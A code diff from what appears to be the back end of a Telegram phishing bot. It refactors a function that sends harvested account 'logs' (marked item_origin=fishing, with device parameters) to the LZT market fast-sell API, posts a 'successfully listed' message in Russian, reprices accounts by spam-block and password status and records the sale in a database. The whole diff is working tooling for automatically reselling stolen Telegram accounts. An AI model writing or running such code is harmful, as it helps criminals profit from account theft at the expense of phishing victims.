@@ -48,7 +48,6 @@ ${log.bot.includes(':') ? `ℹ️ Добытый с бота @${(await new Teleg
 
     if (worker.lztOn && marketSettings) {
         async function send() {
-            console.log("Отправляем логи на лолз", log.deviceParams)
             const response = await axios({
                 method: 'POST',
                 url: 'https://api.lzt.market/item/fast-sell?currency=rub&item_origin=fishing',
@@ -85,18 +84,25 @@ ${log.bot.includes(':') ? `ℹ️ Добытый с бота @${(await new Teleg
 
             const error = (response.data?.errors || response.data?.error)?.[0] || (((response?.status || 200) === 200 || response?.status === 502) ? null : 'Технические работы LZT маркета');
             if (!error) {
+                const account = response?.data?.item;
+                const item_id = account?.item_id;
 
-                const account = response?.data?.item?.items?.[0]
-                console.log(response.data)
-                const item_id = account?.item_id
 
-                msg += `\n\n*✅ Успешно выложен на лолз LZT(https://lzt.market/${item_id})*`
+                msg += `\n\n*✅ Успешно выложен на лолз [LZT](https://lzt.market/${item_id})*`;
 
-                if (account && (account.telegram_spam_block === -3 || account.telegram_password)) {
-                    const price = account.telegram_password == -3 ? marketSettings.pass : marketSettings.spam;
-                    await lolz.editPrice(worker.lzt, item_id, price)
+                if (account?.telegram_spam_block === -3 || account?.telegram_password) {
+                    const price = account.telegram_password === -3 ? marketSettings.pass : marketSettings.spam;
+                    await lolz.editPrice(worker.lzt, item_id, price);
                 }
-                await market.findOneAndUpdate({ id: marketSettings.id }, { $inc: { success: 1 }, $set: { item_id } })
+
+                await market.findOneAndUpdate(
+                    { id: marketSettings.id },
+                    {
+                        $inc: { success: 1 },
+                        $set: { item_id }
+                    }
+                );
+
             } else {
                 if (error === 'captcha') {
                     console.log('капча');
